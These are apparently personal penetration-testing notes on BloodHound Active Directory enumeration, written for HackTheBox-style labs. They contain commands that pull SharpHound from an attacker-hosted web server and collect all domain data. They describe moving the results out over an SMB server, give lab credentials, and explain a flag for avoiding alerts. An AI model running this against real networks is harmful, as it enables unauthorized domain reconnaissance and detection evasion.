# BloodHound
[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

##### Setup
**Start neo4j**
Credentials are *neo4j / @Eatonsquare19!*

```
sudo neo4j console
```

**Start Bloodhound Interface**

```
./Bloodhound --no-sandbox
```

##### Local 
Gather data from SharpHound
Possible Flags: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html

1) Upload *Sharphound.exe* from *$TOOLS/Windows/Enumeration* using techniques from [PowerShell Cheatsheet](obsidian://open?vault=Security%20%26%20PenTesting&file=Utils%2FWindows%2FPowerShell)
```
Invoke-WebRequest -Uri http://10.10.14.12:8000/Enumeration/SharpHound.exe -OutFile -SharpHound.exe
```
3) `./Sharphound.exe -c all --zipfilename=FILENAME
4) Create [SMB server](obsidian://open?vault=Security%20%26%20PenTesting&file=Utils%2FNetwork%2FSMB%20Server%20-%20Impacket) to download the zipfile.
5) Drag into the Bloodhound interface. 
6) Mark any users we have the password to as Owned.

##### Remote  
Gather data using bloodhound-python. 

```
pip3 install bloodhound
```

```
bloodhound-python -c all -u support -p "#00^BlackKnight" -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
```

Using another Windows Machine 
```
Sharphound.exe --CollectionMethods all --Domain DOMAIN/FQDN --ExcludeDCs
```

-   **CollectionMethods** - Determines what kind of data Sharphound would collect. The most common options are Default or All. Also, since Sharphound caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
-   **Domain** - Here, we specify the domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.
-   **ExcludeDCs** -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.